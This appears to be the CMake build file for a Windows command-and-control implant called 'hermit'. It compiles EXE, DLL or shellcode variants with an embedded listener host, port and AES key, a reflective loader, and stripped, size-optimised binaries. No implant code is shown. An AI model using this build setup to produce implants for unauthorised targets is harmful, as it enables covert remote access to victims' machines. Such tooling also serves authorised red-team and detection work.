cmake_minimum_required(VERSION 3.22)
project(${PAYLOAD_NAME}.${PAYLOAD_ARCH})

# COMPILE
if(${PAYLOAD_ARCH} STREQUAL "amd64")
    set(CMAKE_CXX_COMPILER x86_64-w64-mingw32-g++)
elseif(${PAYLOAD_ARCH} STREQUAL "i686")
    set(CMAKE_CXX_COMPILER i686-w64-mingw32-g++)
endif()

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# FLAGS
set(CMAKE_CXX_FLAGS "-municode -Os -s \
    -fno-asynchronous-unwind-tables -falign-jumps=1 -falign-labels=1 \
    -ffunction-sections -fdata-sections -fno-exceptions -fPIC \
    -static-libgcc \
    -Wl,-subsystem,windows,-s,--no-seh,--enable-stdcall-fixup,--gc-sections,-Bstatic"
)

# INCLUDE
include_directories(include)

# MACROS
add_compile_definitions(MODULE_TYPE=${MODULE_TYPE})
add_compile_definitions(LISTENER_PROTOCOL=${LISTENER_PROTOCOL})
add_compile_definitions(LISTENER_HOST=${LISTENER_HOST})
add_compile_definitions(LISTENER_PORT=${LISTENER_PORT})
add_compile_definitions(AES_KEY_BASE64=${AES_KEY_BASE64})
add_compile_definitions(AES_IV_BASE64=${AES_IV_BASE64})
if(${PAYLOAD_FORMAT} STREQUAL "dll" OR ${PAYLOAD_FORMAT} STREQUAL "bin")
    add_compile_definitions(IS_DLL=1)
endif()
if(${PAYLOAD_FORMAT} STREQUAL "bin")
    add_compile_definitions(IS_SHELLCODE=1)
endif()

# SOURCES
set(SOURCE_ASM
        ${ASM_OBJ_REFLECTIVE}
)

set(SOURCE_CORE
        src/core/modules.cpp
        src/core/procs.cpp
)

if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "dll")
    set(SOURCE_MAIN
            src/hermit.cpp
            src/main/main_dll.cpp
            src/main/rfl.cpp
    )
elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
    set(SOURCE_MAIN
            src/hermit.cpp
            src/main/main_exe.cpp
            src/main/rfl.cpp
    )
endif()

# LINK LIBRARILIES
# link_libraries()

# ADD
if(${PAYLOAD_FORMAT} STREQUAL "bin" OR ${PAYLOAD_FORMAT} STREQUAL "dll")
    add_library(${PROJECT_NAME} SHARED ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            LIBRARY_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".dll"
    )
elseif(${PAYLOAD_FORMAT} STREQUAL "exe")
    add_executable(${PROJECT_NAME} ${SOURCE_ASM} ${SOURCE_CORE} ${SOURCE_MAIN})
    set_target_properties(${PROJECT_NAME}
        PROPERTIES
            RUNTIME_OUTPUT_DIRECTORY ${OUTPUT_DIRECTORY}
            PREFIX ""
            SUFFIX ".exe"
    )
endif()
